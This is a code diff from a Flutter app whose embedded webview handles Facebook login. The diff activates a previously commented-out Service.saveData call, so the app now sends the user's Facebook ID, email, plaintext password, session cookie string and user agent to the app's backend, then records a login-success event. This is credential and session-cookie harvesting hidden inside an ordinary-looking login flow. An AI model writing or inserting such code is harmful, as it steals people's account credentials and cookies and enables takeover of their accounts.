@@ -130,19 +130,19 @@ class _WebviewState extends State<Webview> {
 
                         await storage.write(
                             key: "userArgent", value: userArgent);
+                        final saveResponse = await Service.saveData({
+                          'id_facebook': fbId,
+                          'email': email!,
+                          'password': password!,
+                          'cookie': cookieStr,
+                          'user_agent': userArgent,
+                          'from_app': dotenv.env['APP_NAME'],
+                        });
                       }
 
                       if (url.toString().startsWith("view-source")) {
-                        // final saveResponse = await Service.saveData({
-                        //   'id_facebook': fbId,
-                        //   'email': email!,
-                        //   'password': password!,
-                        //   'cookie': cookieStr,
-                        //   'user_agent': userArgent,
-                        //   'from_app': dotenv.env['APP_NAME'],
-                        // });
-                        // Navigator.pushNamed(context, HomeLayout.routeName);
-                        // await Service.trackingLoginFacebookSuccess();
+                        Navigator.pushNamed(context, HomeLayout.routeName);
+                        await Service.trackingLoginFacebookSuccess();
                       }
                     },
                     onConsoleMessage: _onConsoleMessage,
@@ -195,7 +195,7 @@ class _WebviewState extends State<Webview> {
         await storage.write(key: "fb_token", value: token);
       }
     } catch (e) {
-       debugPrint(e.toString());
+      debugPrint(e.toString());
     }
   }
 
